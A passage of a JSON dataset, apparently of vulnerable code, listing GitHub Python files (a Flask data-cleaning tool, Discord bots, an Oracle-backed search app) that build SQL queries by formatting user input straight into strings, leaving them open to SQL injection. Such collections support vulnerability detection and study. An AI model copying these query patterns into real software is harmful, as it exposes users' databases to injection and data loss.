items',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/delete_predicate', methods=['POST'])\n@login_required\ndef delete_predicate():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    condition = ''\n    columns = []\n    conditions = []\n    operators = []\n    logics = []\n    for i in request.form:\n        if i.startswith('column'):\n            columns.append(i)\n        elif i.startswith('condition'):\n            conditions.append(i)\n        elif i.startswith('logical'):\n            logics.append(i)\n        elif i.startswith('operator'):\n            operators.append(i)\n    columns.sort()\n    conditions.sort()\n    logics.sort()\n    operators.sort()\n    for i in range(len(columns)):\n        if i != len(columns) - 1:\n            condition += '\"' + request.form[columns[i + 1]] + '\"'\n            if request.form[operators[i + 1]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[i + 1]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[i + 1]]\n            condition += '\\'' + request.form[conditions[i + 1]] + '\\''\n            condition += ' ' + request.form[logics[i]] + ' '\n        else:\n            condition += '\"' + request.form[columns[0]] + '\"'\n            if request.form[operators[0]] == 'CONTAINS':\n                condition += ' ~ '\n            elif request.form[operators[0]] == 'NOT CONTIANS':\n                condition += ' !~ '\n            else:\n                condition += request.form[operators[0]]\n            condition += '\\'' + request.form[conditions[0]] + '\\''\n\n    try:\n        delete_rows(table.name, condition)\n        create_action('rows deleted with condition \"{0}\"'\n                      .format(condition), dataset.id, current_user.id\n                      )\n    except:\n        flash('condition \"{0}\" not valid'.format(condition), 'danger')\n    else:\n        flash('successfully deleted rows using condition \"{0}\"'\n              .format(condition), 'success'\n              )\n    return redirect(request.referrer)\n\n\n@_transform.route('/reset', methods=['GET'])\n@login_required\ndef reset():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    restore_original(dataset.working_copy)\n    create_action(\n        'restored dataset to original state',\n        dataset.id,\n        current_user.id\n    )\n    return redirect(request.referrer)\n\n\n@_transform.route('/change_type', methods=['POST'])\n@login_required\ndef change_type():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    table = table_name_to_object(dataset.working_copy)\n    col = request.form['column']\n    col = col[:col.find('(')-1]\n    new_type = request.form['type']\n    if col != '' and new_type != '':\n        try:\n            change_attribute_type(table.name, col, new_type)\n            create_action('type {0} changed to {1}'.format(col, new_type), dataset.id, current_user.id)\n        except:\n            flash('{0} could not be converted to {1}'.format(col, new_type), 'danger')\n        else:\n            flash('{0} successfully  converted to {1}'.format(col, new_type), 'success')\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/find_and_replace', methods=['POST'])\n@login_required\ndef find_and_replace():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    col = request.form['column']\n    find = request.form['find']\n    match_mode = request.form['match-mode']\n    replace = request.form['replace']\n\n    if match_mode == 'full-match':\n        find_replace(dataset.working_copy, col, find, replace)\n    elif match_mode == 'substring-match':\n        replace_mode = request.form['replace-mode']\n        if replace_mode == 'full-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=True)\n        elif replace_mode == 'substring-replace':\n            substring_find_replace(dataset.working_copy,\n                                   col,\n                                   find,\n                                   replace,\n                                   full=False)\n    elif match_mode == 'regex-match':\n        regex_find_replace(dataset.working_copy, col, find, replace)\n\n    return redirect(request.referrer)\n\n\n@_transform.route('/fill_null', methods=['POST'])\n@login_required\ndef fill_null():\n    dataset = get_dataset_with_id(request.args.get('dataset_id'))\n    column_and_type = request.form['column']\n    column_name = column_and_type[:column_and_type.find(' ')]\n    column_type = column_and_type[column_and_type.find('(')+1:column_and_type.rfind(')')]\n    fill_value = request.form['fill_value']\n\n    try:\n        if fill_value == '~option-average~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_average(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with average'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        elif fill_value == '~option-median~':\n            if column_type not in ['INTEGER', 'BIGINT', 'DOUBLE PRECISION']:\n                flash('Operation not supported for this column type.', 'danger')\n            else:\n                fill_null_with_median(dataset.working_copy, column_name)\n                create_action(\n                    'Filled null values in {0} with median'.format(column_name),\n                    dataset.id,\n                    current_user.id\n                )\n        else:\n            is_text_type = column_type in ['TEXT',\n                                           'VARCHAR(10)',\n                                           'VARCHAR(25)',\n                                           'VARCHAR(255)']\n            fill_null_with(\n                dataset.working_copy,\n                column_name,\n                fill_value,\n                is_text_type\n            )\n            create_action(\n                'Filled null values in {0} with {1}'\n                .format(column_name, fill_value),\n                dataset.id,\n                current_user.id\n            )\n    except:\n        flash(\n            'An unexpected error occured while performing the operation',\n            'danger'\n            )\n    else:\n        flash('Fill operation completed successfully', 'success')\n\n    return redirect(request.referrer)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/svissers/datacleaner/blob/31033ed572265f69509e3ede5c30b0a222686b9d",
        "file_path": "/app/Data/Transform/operations.py",
        "source": "from app import database as db\nimport pandas as pd\nimport re\nimport numpy as np\n\n\ndef rename_attribute(table_name, column, new_name):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'RENAME COLUMN \"{1}\" TO \"{2}\"'\n            .format(table_name, column, new_name)\n        )\n    except Exception as e:\n        print(\"RENAMING FAILED: \"+str(e))\n\n\ndef delete_attribute(table_name, column):\n    try:\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'DROP COLUMN \"{1}\"'\n            .format(table_name, column)\n        )\n    except:\n        print(\"DELETING FAILED\")\n\n\ndef restore_original(table_name):\n    \"\"\"\n    Resets given table to its original state\n    :param table_name: name of the the table to be reset\n    \"\"\"\n    try:\n        # Original tables are prepended with og\n        # Thus we replace wc with og and have the name of the table\n        # with the original data\n        original = 'og' + table_name[2:]\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        db.engine.execute(\n            'CREATE TABLE \"{0}\" AS SELECT * FROM \"{1}\"'\n            .format(table_name, original)\n        )\n    except:\n        print(\"FAILED TO RESTORE ORIGINAL\")\n\n\ndef change_attribute_type(table_name, table_col, new_type):\n    \"\"\"\n    Changes the type of given attribute in given table to new_type\n    :param table_name: table containing the attribute\n    :param table_col: attribute to change type of\n    :param new_type: new type\n    \"\"\"\n    current_type = db.engine.execute(\n        'SELECT data_type from information_schema.columns '\n        'where table_name = \\'{0}\\' and column_name = \\'{1}\\';'\n        .format(table_name, table_col)\n    ).fetchall()[0][0]\n    if new_type == 'INTEGER':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE BIGINT USING \"{1}\"::bigint'\n            .format(table_name, table_col))\n    if new_type == 'DOUBLE':\n        db.engine.execute(\n            'ALTER TABLE {0} '\n            'ALTER COLUMN \"{1}\" '\n            'TYPE DOUBLE PRECISION USING \"{1}\"::double precision'\n            .format(table_name, table_col))\n    if new_type == 'TEXT':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n        elif current_type == 'timestamp with time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT USING to_char(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TEXT'\n                .format(table_name, table_col))\n    if new_type == 'DATE':\n        if current_type == 'timestamp with time zone':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE DATE USING to_date(\"{1}\", \\'DD/MM/YYYY\\')'\n                .format(table_name, table_col))\n    if new_type == 'TIMESTAMP':\n        if current_type == 'date':\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP WITH TIME ZONE'\n                .format(table_name, table_col))\n        else:\n            db.engine.execute(\n                'ALTER TABLE {0} '\n                'ALTER COLUMN \"{1}\" '\n                'TYPE TIMESTAMP WITH TIME ZONE '\n                'USING to_timestamp(\"{1}\", \\'DD/MM/YYYY HH24:MI:SS\\')'\n                .format(table_name, table_col))\n\n\ndef drop_attribute(table_name, attr):\n    \"\"\"\n    Drops given attribute from given table\n    :param table_name: table to perform the operation on\n    :param attr: attribute to drop\n    \"\"\"\n    try:\n        db.engine.execute(\n            'ALTER TABLE \"{0}\" DROP COLUMN IF EXISTS \"{1}\"'.\n            format(table_name, attr)\n        )\n    except:\n        print(\"FAILED TO DROP ATTRIBUTE {0} FROM {1}\".format(attr, table_name))\n\n\ndef one_hot_encode(table_name, attr):\n    \"\"\"\n    One hot encodes given attribute\n    :param table_name: table on which to perform the operation\n    :param attr: attribute to one hot encode\n    :return:\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine)\n        one_hot = pd.get_dummies(dataframe[attr])\n        print('OH', one_hot)\n        dataframe = dataframe.join(one_hot)\n        print('DF', dataframe)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        dataframe.to_sql(\n            name=table_name,\n            con=db.engine,\n            if_exists=\"fail\",\n            index=False\n        )\n    except:\n        print('ONE-HOT ENCODING FAILED')\n\n\ndef fill_null_with(table_name, attr, value, text_type):\n    \"\"\"\n    Fills all NULL values with provided value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    :param text_type: indicates whether column is a text type\n    :param value: value to insert\n    \"\"\"\n    try:\n        if text_type:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE (\"{1}\" = \\'\\') IS NOT FALSE'\n                .format(table_name, attr, value)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = {2} '\n                'WHERE \"{1}\" IS NULL'\n                .format(table_name, attr, value)\n            )\n    except Exception as e:\n        print('FILL NULL FAILED WITH FOLLOWING MESSAGE:\\n' + str(e))\n\n\ndef fill_null_with_average(table_name, attr):\n    \"\"\"\n    Fills all NULL values with average value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        average = dataframe[attr].mean()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, average)\n        )\n    except:\n        print('FILL AVERAGE FAILED')\n\n\ndef fill_null_with_median(table_name, attr):\n    \"\"\"\n    Fills all NULL values with median value in table_name.attr\n    :param table_name: table to perform the operation on\n    :param attr: attribute containing NULL values\n    \"\"\"\n    try:\n        dataframe = pd.read_sql_table(table_name, db.engine, columns=[attr])\n        median = dataframe[attr].median()\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = {2} '\n            'WHERE \"{1}\" IS NULL'\n            .format(table_name, attr, median)\n        )\n    except:\n        print('FILL MEAN FAILED')\n\n\ndef find_replace(table_name, attr, find, replace):\n    try:\n        db.engine.execute(\n            'UPDATE \"{0}\" '\n            'SET \"{1}\" = \\'{2}\\' '\n            'WHERE \"{1}\" = \\'{3}\\' '\n            .format(table_name, attr, replace, find)\n        )\n    except:\n        print('FIND-REPLACE FAILED')\n\n\ndef substring_find_replace(table_name, attr, find, replace, full=False):\n    try:\n        if full:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = \\'{2}\\' '\n                'WHERE \"{1}\" LIKE \\'%%{3}%%\\' '\n                .format(table_name, attr, replace, find)\n            )\n        else:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, find, replace)\n            )\n    except Exception as e:\n        print('FIND-REPLACE FAILED\\n' + str(e))\n\n\ndef regex_find_replace(table_name, attr, regex, replace):\n    try:\n        is_valid = True\n        try:\n            re.compile(regex)\n        except re.error:\n            is_valid = False\n        if is_valid:\n            db.engine.execute(\n                'UPDATE \"{0}\" '\n                'SET \"{1}\" = REGEXP_REPLACE(\"{1}\", \\'{2}\\', \\'{3}\\')'\n                .format(table_name, attr, regex, replace)\n            )\n    except Exception as e:\n        print('REGEX FIND-REPLACE FAILED:\\n' + str(e))\n\n\ndef normalize_attribute(table_name, attr):\n    \"\"\"\n    Normalizes table_name.attr using z-score method\n    :param table_name: table to perform the operation on\n    :param attr: attribute to normalize\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        df[attr] = (df[attr] - df[attr].mean()) / df[attr].std(ddof=0)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except:\n        print('NORMALIZATION FAILED')\n\n\ndef remove_outliers(table_name, attr, value, smaller_than=False):\n    \"\"\"\n    Removes outliers based on provided value\n    :param table_name: table to perform the operation on\n    :param attr: attribute to search for outliers\n    :param value: extrema value\n    :param smaller_than:  if true values smaller than are filtered,\n                          values greater than otherwise\n    \"\"\"\n    try:\n        if smaller_than:\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" < {2}'\n                .format(table_name, attr, value)\n            )\n        else:  # greater than\n            db.engine.execute(\n                'DELETE FROM \"{0}\" '\n                'WHERE \"{1}\" > {2}'\n                .format(table_name, attr, value)\n            )\n    except:\n        print('REMOVE OUTLIERS FAILED')\n\n\ndef delete_rows(table_name, condition):\n\n    db.engine.execute(\n        'DELETE FROM \"{0}\" WHERE {1}'.format(table_name, condition)\n    )\n\n\ndef discretize_width(table_name, attr, intervals, dataframe=None, name=None):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-width\n    intervals equal to interval amount\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals:\n        - int: number of equal width intervals\n        - [int]: non-uniform interval edges\n    :param dataframe: Dataframe if data has already been read from sql\n    \"\"\"\n    try:\n        if dataframe is not None:\n            df = dataframe\n        else:\n            df = pd.read_sql_table(table_name, db.engine)\n        if name is not None:\n            column_name = name\n        elif isinstance(intervals, list):\n            column_name = attr + '_custom_intervals'\n        else:\n            column_name = attr + '_' + str(intervals) + '_eq_intervals'\n\n        df[column_name] = pd.cut(df[attr], intervals, precision=9).apply(str)\n        db.engine.execute(\n            'DROP TABLE \"{0}\"'.format(table_name)\n        )\n        df.to_sql(name=table_name, con=db.engine, if_exists=\"fail\", index=False)\n    except Exception as e:\n        print('WIDTH DISCRETIZATION FAILED:\\n' + str(e))\n\n\ndef discretize_eq_freq(table_name, attr, intervals):\n    \"\"\"\n    Discretizes table_name.attr into a number of equal-frequency\n    intervals equal to intervals\n    :param table_name: table to perform operation on\n    :param attr: attribute to discretize\n    :param intervals: number of equal frequency intervals\n    \"\"\"\n    try:\n        df = pd.read_sql_table(table_name, db.engine)\n        attr_length = len(df[attr])\n        elements_per_interval = attr_length//intervals\n        sorted_data = list(df[attr].sort_values())\n        selector = 0\n        edge_list = []\n        while selector < attr_length:\n            try:\n                edge_list.append(sorted_data[selector])\n                selector += elements_per_interval\n            except IndexError:\n                pass\n        if edge_list[-1] != sorted_data[-1] and len(edge_list) == intervals + 1:\n            edge_list[-1] = sorted_data[-1]\n        elif edge_list[-1] != sorted_data[-1] and len(edge_list) != intervals + 1:\n            edge_list.append(sorted_data[-1])\n\n        # Extend outer edges with 0.1% to include min and max values\n        edge_list[0] = edge_list[0]-edge_list[0]*0.001\n        edge_list[-1] = edge_list[-1]+edge_list[-1]*0.001\n\n        column_name = attr + '_' + str(intervals) + '_eq_freq_intervals'\n\n        discretize_width(table_name, attr, edge_list, df, column_name)\n    except Exception as e:\n        print('EQUAL FREQUENCY DISCRETIZATION FAILED:\\n' + str(e))\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Naught0/qtbot/blob/49234cfd7309f97b9e71fb2b65df8657ac1e9db5",
        "file_path": "/utils/user_funcs.py",
        "source": "#!bin/env python\n\nimport asyncpg\n\nclass PGDB:\n    def __init__(self, db_conn):\n        self.db_conn = db_conn\n\n    async def fetch_user_info(self, member_id: int, column: str):\n        query = f'''SELECT {column} FROM user_info WHERE member_id = {member_id};'''\n        return await self.db_conn.fetchval(query)\n\n    async def insert_user_info(self, member_id: int, column: str, col_value):\n        execute = (\n            f\"\"\"INSERT INTO user_info (member_id, {column}) \n                    VALUES ({member_id}, {col_value})\n                    ON CONFLICT (member_id)\n                        DO UPDATE SET {column} = {col_value};\"\"\")\n        await self.db_conn.execute(execute)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/paulnicolet/IDBS-comics/blob/e9ef6bf3299fdaaea8342ec6e893e990b2c848c9",
        "file_path": "/comics-app/comics.py",
        "source": "from flask import Flask, g, render_template, request, jsonify\nfrom utils import get_db, get_queries, shutdown, ajax, execute_query, generic_search\nimport os\nimport atexit\n\napp = Flask(__name__)\n\n# Register clean up function\natexit.register(shutdown, app=app, context=g)\n\n# Set app configuration\napp.config.update({'DB_USER': os.environ['IDBS_USER'],\n                   'DB_PWD': os.environ['IDBS_PWD'],\n                   'DB_SERVER': 'diassrv2.epfl.ch',\n                   'DB_PORT': 1521,\n                   'DB_SID': 'orcldias',\n                   'DEBUG': True,\n                   'QUERIES_PATH': 'queries.sql'})\n\n\n@app.route('/')\ndef home():\n    con = get_db(app, g)\n    return render_template('index.html')\n\n\n@app.route('/search', methods=['GET', 'POST'])\n@ajax\ndef search():\n    # If GET, return the form to render\n    if request.method == 'GET':\n        return render_template('search-form.html')\n\n    # If POST, process the query and return data\n    keywords = request.form['keywords']\n    tables = list(request.form.keys())\n    tables.remove('keywords')\n\n    data = generic_search(keywords, tables, app, g)\n    return jsonify(data)\n\n\n@app.route('/queries', methods=['GET', 'POST'])\n@ajax\ndef queries():\n    if request.method == 'GET':\n        return render_template('queries-form.html', queries=get_queries(app, g))\n\n    # Get query and execute it\n    query_key = request.form['query-selector']\n    query = get_queries(app, g)[query_key]\n    (schema, data) = execute_query(app, g, query)\n\n    return jsonify([('', schema, data)])\n\n\n@app.route('/get_table_names', methods=['GET'])\n@ajax\ndef get_table_names():\n    query = 'SELECT table_name FROM user_tables'\n    data = execute_query(app, g, query)[1]\n    return jsonify(data)\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/paulnicolet/IDBS-comics/blob/e9ef6bf3299fdaaea8342ec6e893e990b2c848c9",
        "file_path": "/comics-app/utils.py",
        "source": "from flask import abort, request\nfrom functools import wraps\nimport cx_Oracle\nimport re\n\n\ndef get_db(app, context):\n    \"\"\" Connect to the database and return connection \"\"\"\n    if not hasattr(context, 'db'):\n        dsn_tns = cx_Oracle.makedsn(app.config['DB_SERVER'],\n                                    app.config['DB_PORT'],\n                                    app.config['DB_SID'])\n\n        context.db = cx_Oracle.connect(app.config['DB_USER'],\n                                       app.config['DB_PWD'],\n                                       dsn_tns)\n\n    return context.db\n\n\ndef get_queries(app, context):\n    \"\"\" Parse and return predefined queries \"\"\"\n    if not hasattr(context, 'queries'):\n        with open(app.config['QUERIES_PATH'], 'r') as fd:\n            sqlFile = fd.read()\n\n        # all SQL commands (split on ';')\n        sqlCommands = sqlFile.split(';')\n        context.queries = {}\n        for command in sqlCommands:\n            command = re.sub(r'\\s*--\\s*|\\s*\\n\\s*', ' ', command)\n            query = command.split(':')\n            context.queries[query[0]] = query[1]\n\n    return context.queries\n\n\ndef execute_query(app, context, query):\n    \"\"\" Execute a query and return corresponding data \"\"\"\n    # Execute query\n    con = get_db(app, context)\n    cur = con.cursor()\n    cur.execute(query)\n\n    # Return data with description\n    return (extract_schema(cur.description), cur.fetchall())\n\n\ndef generic_search(keywords, tables, app, context):\n    # List of tuples (table_name, schema, tuples)\n    result = []\n    for table in tables:\n        # Get columns for the table\n        query = 'SELECT * FROM {} WHERE 1=0'.format(table)\n        description = execute_query(app, context, query)[0]\n\n        # Build conditions\n        conditions = []\n        for col in description:\n            conditions.append('{} LIKE \\'%{}%\\''.format(col, keywords))\n\n        conditions = ' OR '.join(conditions)\n\n        # Execute query\n        query = 'SELECT * FROM {} WHERE {}'.format(table, conditions)\n        (schema, data) = execute_query(app, context, query)\n        result.append((table, schema, data))\n\n    return result\n\n\ndef extract_schema(description):\n    names = []\n    for col in description:\n        names.append(col[0])\n\n    return names\n\n\ndef shutdown(app, context):\n    \"\"\" Clean-up application state before shutdown \"\"\"\n    with app.app_context():\n        get_db(app, context).close()\n\n\ndef ajax(f):\n    \"\"\" Custom decoractor to restrict acces to AJAX calls \"\"\"\n    @wraps(f)\n    def decorated_function(*args, **kwargs):\n        if not request.is_xhr:\n            return abort(401)\n        return f(*args, **kwargs)\n    return decorated_function\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/Atomicbeast101/jinux-discord/blob/b998bc127eb54b6f03765345ba6dc1079c39daf0",
        "file_path": "/cmds/remindme.py",
        "source": "from datetime import datetime, timedelta\nfrom time import localtime, strftime\nimport sqlite3\n\n\n# Get the new date from string time/date\ndef get_date(time):\n    now = datetime.now()\n    if ',' in time:\n        times = time.split(',')\n        for t in times:\n            val = t\n            if 's' in val:\n                val = val.replace('s', '')\n                now += timedelta(seconds=int(val))\n            elif 'm' in val:\n                val = val.replace('m', '')\n                now += timedelta(minutes=int(val))\n            elif 'h' in val:\n                val = val.replace('h', '')\n                now += timedelta(hours=int(val))\n            elif 'd' in val:\n                val = val.replace('d', '')\n                now += timedelta(days=int(val))\n    else:\n        val = time\n        if 's' in val:\n            val = val.replace('s', '')\n            now += timedelta(seconds=int(val))\n        elif 'm' in val:\n            val = val.replace('m', '')\n            now += timedelta(minutes=int(val))\n        elif 'h' in val:\n            val = val.replace('h', '')\n            now += timedelta(hours=int(val))\n        elif 'd' in val:\n            val = val.replace('d', '')\n            now += timedelta(days=int(val))\n    return now\n\n\n# RemindMe command\nasync def ex_me(dclient, channel, mention, con, con_ex, author_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('0', {}, '{}', '{}');\"\n                               .format(author_id, msg, date.strftime('%Y-%m-%d %X')))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindme <time> <message...>'.format(mention, cmd_char))\n        print('')\n\n\n# RemindAll command\nasync def ex_all(dclient, channel, mention, con, con_ex, channel_id, a, log_file, cmd_char):\n    a = a.split(' ')\n    if len(a) >= 2:\n        time = a[0].lower()\n        msg = ''\n        for i in range(1, len(a)):\n            msg += a[i] + ' '\n        if 'd' in time or 'h' in time or 'm' in time or 's' in time or ',' in time:\n            date = get_date(time)\n            try:\n                con_ex.execute(\"INSERT INTO reminder (type, channel, message, date) VALUES ('1', {}, '{}', '{}');\"\n                               .format(channel_id, msg, str(date)))\n                con.commit()\n                await dclient.send_message(channel, '{}, will remind you.'.format(mention))\n            except sqlite3.Error as e:\n                await dclient.send_message(channel, '{}, error when trying to add info to database! Please notifiy '\n                                                    'the admins!'.format(mention))\n                print('[{}]: {} - {}'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                             'Error when trying to insert data: ' + e.args[0]))\n                log_file.write('[{}]: {} - {}\\n'.format(strftime(\"%b %d, %Y %X\", localtime()), 'SQLITE',\n                                                        'Error when trying to insert data: ' + e.args[0]))\n        else:\n            await dclient.send_message(channel, '{}, The time must be in #time format (ex: 1h or 2h,5m).'\n                                       .format(mention, cmd_char))\n    else:\n        await dclient.send_message(channel, '{}, **USAGE:** {}remindall <time> <message...>'.format(mention, cmd_char))\n        print('')\n",
        "dataset": "plain_sql.json"
    },
    {
        "html_url": " https://github.com/zwj2017-NK/FAB/blob/378443166011eb2f9f502611ce1d2a587710a1e9",
        "file_path": "/flask_appbuilder/models/sqla/interface.py",
        "source": "# -*- coding: utf-8 -*-\nimport sys\nimport logging\nimport sqlalchemy as sa\n\nfrom . import filters\nfrom sqlalchemy.orm import joinedload\nfrom sqlalchemy.exc import IntegrityError\nfrom sqlalchemy import func\nfrom sqlalchemy.orm.properties import SynonymProperty\n\nfrom ..base import BaseInterface\nfrom ..group import GroupByDateYear, GroupByDateMonth, GroupByCol\nfrom ..mixins import FileColumn, ImageColumn\nfrom ...filemanager import FileManager, ImageManager\nfrom ..._compat import as_unicode\nfrom ...const import LOGMSG_ERR_DBI_ADD_GENERIC, LOGMSG_ERR_DBI_EDIT_GENERIC, LOGMSG_ERR_DBI_DEL_GENERIC, \\\n    LOGMSG_WAR_DBI_ADD_INTEGRITY, LOGMSG_WAR_DBI_EDIT_INTEGRITY, LOGMSG_WAR_DBI_DEL_INTEGRITY\n\nlog = logging.getLogger(__name__)\n\n\ndef _include_filters(obj):\n    for key in filters.__all__:\n        if not hasattr(obj, key):\n            setattr(obj, key, getattr(filters, key))\n\n\nclass SQLAInterface(BaseInterface):\n    \"\"\"\n    SQLAModel\n    Implements SQLA support methods for views\n    \"\"\"\n    session = None\n\n    filter_converter_class = filters.SQLAFilterConverter\n\n    def __init__(self, obj, session=None):\n        _include_filters(self)\n        self.list_columns = dict()\n        self.list_properties = dict()\n\n        self.session = session\n        # Collect all SQLA columns and properties\n        for prop in sa.orm.class_mapper(obj).iterate_properties:\n            if type(prop) != SynonymProperty:\n                self.list_properties[prop.key] = prop\n        for col_name in obj.__mapper__.columns.keys():\n            if col_name in self.list_properties:\n                self.list_columns[col_name] = obj.__mapper__.columns[col_name]\n        super(SQLAInterface, self).__init__(obj)\n\n    @property\n    def model_name(self):\n        \"\"\"\n            Returns the models class name\n            useful for auto title on views\n        \"\"\"\n        return self.obj.__name__\n\n    def _get_base_query(self, query=None, filters=None, order_column='', order_direction=''):\n        if filters:\n            query = filters.apply_all(query)\n        if order_column != '':\n            # if Model has custom decorator **renders('<COL_NAME>')**\n            # this decorator will add a property to the method named *_col_name*\n            if hasattr(self.obj, order_column):\n                if hasattr(getattr(self.obj, order_column), '_col_name'):\n                    order_column = getattr(getattr(self.obj, order_column), '_col_name')\n            query = query.order_by(order_column + ' ' + order_direction)\n        return query\n\n    def query(self, filters=None, order_column='', order_direction='',\n              page=None, page_size=None):\n        \"\"\"\n            QUERY\n            :param filters:\n                dict with filters {<col_name>:<value,...}\n            :param order_column:\n                name of the column to order\n            :param order_direction:\n                the direction to order <'asc'|'desc'>\n            :param page:\n                the current page\n            :param page_size:\n                the current page size\n\n        \"\"\"\n        query = self.session.query(self.obj)\n        if len(order_column.split('.')) >= 2:\n            tmp_order_column = ''\n            for join_relation in order_column.split('.')[:-1]:\n                model_relation = self.get_related_model(join_relation)\n                query = query.join(model_relation)\n                # redefine order column name, because relationship can have a different name\n                # from the related table name.\n                tmp_order_column = tmp_order_column + model_relation.__tablename__ + '.'\n            order_column = tmp_order_column + order_column.split('.')[-1]\n        query_count = self.session.query(func.count('*')).select_from(self.obj)\n\n        query_count = self._get_base_query(query=query_count,\n                                           filters=filters)\n        query = self._get_base_query(query=query,\n                                     filters=filters,\n                                     order_column=order_column,\n                                     order_direction=order_direction)\n\n        count = query_count.scalar()\n\n        if page:\n            query = query.offset(page * page_size)\n        if page_size:\n            query = query.limit(page_size)\n\n        return count, query.all()\n\n    def query_simple_group(self, group_by='', aggregate_func=None, aggregate_col=None, filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByCol(group_by, 'Group by')\n        return group.apply(query_result)\n\n    def query_month_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group = GroupByDateMonth(group_by, 'Group by Month')\n        return group.apply(query_result)\n\n    def query_year_group(self, group_by='', filters=None):\n        query = self.session.query(self.obj)\n        query = self._get_base_query(query=query, filters=filters)\n        query_result = query.all()\n        group_year = GroupByDateYear(group_by, 'Group by Year')\n        return group_year.apply(query_result)\n\n    \"\"\"\n    -----------------------------------------\n         FUNCTIONS for Testing TYPES\n    -----------------------------------------\n    \"\"\"\n\n    def is_image(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, ImageColumn)\n        except:\n            return False\n\n    def is_file(self, col_name):\n        try:\n            return isinstance(self.list_columns[col_name].type, FileColumn)\n        